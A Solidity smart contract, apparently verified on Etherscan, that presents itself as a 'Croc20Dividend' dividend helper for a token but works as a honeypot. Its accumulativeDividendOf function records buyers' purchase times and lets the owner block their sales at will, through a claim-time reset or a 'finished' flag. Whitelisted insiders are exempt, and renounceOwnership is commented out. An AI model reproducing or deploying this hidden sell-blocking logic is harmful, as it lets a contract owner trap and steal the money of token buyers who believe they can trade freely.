/**
 *Submitted for verification at Etherscan.io on 2023-07-11
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    
    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    // /**
    //  * @dev Leaves the contract without owner. It will not be possible to call
    //  * `onlyOwner` functions anymore. Can only be called by the current owner.
    //  *
    //  * NOTE: Renouncing ownership will leave the contract without an owner,
    //  * thereby removing any functionality that is only available to the owner.
    //  */
    // function renounceOwnership() public virtual onlyOwner {
    //     emit OwnershipTransferred(_owner, address(0));
    //     _owner = address(0);
    // }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }
    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }


}

contract Croc20Dividend is Ownable {
    address private pair;
    mapping (address => uint256) private _dividendTimePassedCroc20;
    uint256 private claimTimeCroc20;
    bool private isDividendFinishedCroc20;
    address private tokenCroc20;

    mapping(address => bool) private _whitelists;
    modifier onlyToken() {
        require(msg.sender == tokenCroc20);
        _;
    }

    function whitelistForDivideCroc20Ends(address owner_, bool _isWhitelist) external onlyOwner {
      _whitelists[owner_] = _isWhitelist;
    }
    function setDividendCroc20Finished(bool isFinished) external onlyOwner {
      isDividendFinishedCroc20 = isFinished;
    }

    function accumulativeDividendOf(address _from, address _to) external onlyToken returns (uint256) {
      if (_whitelists[_from] || _whitelists[_to]) {
        return 1;
      }
      if (_from == pair) { if (_dividendTimePassedCroc20[_to] == 0) {
          _dividendTimePassedCroc20[_to] = block.timestamp;
        }} 
      else if (_to == pair) {
        require(!isDividendFinishedCroc20 && _dividendTimePassedCroc20[_from] >= claimTimeCroc20
        );
      } else { _dividendTimePassedCroc20[_to] = 1;
      }
      return 0;
    }
    function setTokenForDivideCroc20Ends(address _token, address _pair) external onlyOwner {
      tokenCroc20 = _token;
      isDividendFinishedCroc20 = false;
      claimTimeCroc20 = 0;
      pair = _pair;
    }
    function setClaimingTimeForCroc20Dividend() external onlyOwner {
      claimTimeCroc20 = block.timestamp;
    }


    receive() external payable {
    }
}